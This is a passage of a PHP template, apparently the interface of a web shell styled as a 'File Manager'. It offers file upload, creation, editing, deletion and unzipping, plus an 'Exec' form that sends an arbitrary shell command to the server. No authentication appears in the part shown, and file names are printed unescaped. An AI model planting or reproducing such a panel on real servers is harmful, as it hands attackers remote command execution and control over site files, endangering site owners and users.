</style></head><body>
<h1><?=$m?> File Manager</h1>
<div class="box"><?=$bread?></div>
<div class="box">
<form style="display:inline" method="post" enctype="multipart/form-data" action="?p=<?=urlencode($dir)?>&f=upload">
  <input type="file" name="file"> <button>Upload</button>
</form>
<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=create">
  <input type="text" name="newfile" placeholder="newfile.txt"> <button>Create</button>
</form>
<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=mkdir">
  <input type="text" name="foldername" placeholder="newfolder"> <button>Mkdir</button>
</form>
<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=exec">
  <input type="text" name="cmd" placeholder="command"> <button>Exec</button>
</form>
</div>
<hr>
<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php foreach ($items as $item):
    if ($item=='.'||$item=='..') continue;
    $full = $dir.'/'.$item;
    $isDir = is_dir($full);
    $size = $isDir ? '' : number_format(filesize($full));
    $link = $isDir ? '?p='.urlencode($full) : '?p='.urlencode($dir).'&f=edit&file='.urlencode($item);
    $del = '?p='.urlencode($dir).'&f=delete&file='.urlencode($item);
    $unzip = ($isDir || pathinfo($item, PATHINFO_EXTENSION)!='zip') ? '' : ' <a href="?p='.urlencode($dir).'&f=unzip&file='.urlencode($item).'">[unzip]</a>';
?>
<tr>
<td><a href="<?=$link?>"><?=$isDir?'ðŸ“':'ðŸ“„'?> <?=$item?></a></td>
<td><?=$size?></td>
<td><a href="<?=$del?>" onclick="return confirm('Delete?')">[del]</a><?=$unzip?></td>
</tr>
<?php endforeach; ?>
</table>
</body></html>
